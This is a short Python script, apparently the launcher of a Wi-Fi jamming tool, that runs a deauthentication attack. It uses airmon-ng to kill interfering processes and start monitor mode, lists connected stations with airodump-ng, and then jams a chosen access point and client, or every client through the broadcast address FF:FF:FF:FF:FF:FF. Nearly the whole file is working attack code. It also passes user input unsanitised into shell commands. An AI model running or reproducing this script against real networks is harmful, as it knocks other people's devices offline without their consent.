import sys
import os
import subprocess
sys.path.append(".")
from src.jammer import Jammer

if __name__ == "__main__":

    jammer = Jammer()

    subprocess.Popen('figlet "Deauthentication attack"', shell=True)

    FNULL = open(os.devnull, 'w')

    bssid = jammer.network_scan()

    red = input("Tell me the network number you want to jam: ")

    #Call airmon-ng to show the user a list of available network cards on their device
    subprocess.call('airmon-ng', shell=True)

    #start up monitor mode on a network card
    networkCard = input('Please enter the name of the network card you wish to use: ')

	#Kill all processes that can interrupt
    subprocess.call('airmon-ng check kill', stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    #Start monitor mode on the selected device
    subprocess.call('airmon-ng start {}'.format(networkCard), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    #Call airmon-ng to show the user a list of available network cards on their device
    subprocess.call('airmon-ng', shell=True)

    card = input('Please enter the name of the monitor mode network card you wish to use: ')

    bssid_selected = bssid[int(red)]

    time = jammer.calcule_time()

    try:
        #Call airodump-ng to show stations conected
        subprocess.call('airodump-ng --bssid {} {}'.format(bssid_selected,card), shell=True)
    except KeyboardInterrupt:
        print('\n')

    client = input('Please enter the station you want to jam(write FF:FF:FF:FF:FF:FF if you want to jam all stations): ')

    jammer.jam_dea(bssid[int(red)], card, client, time)
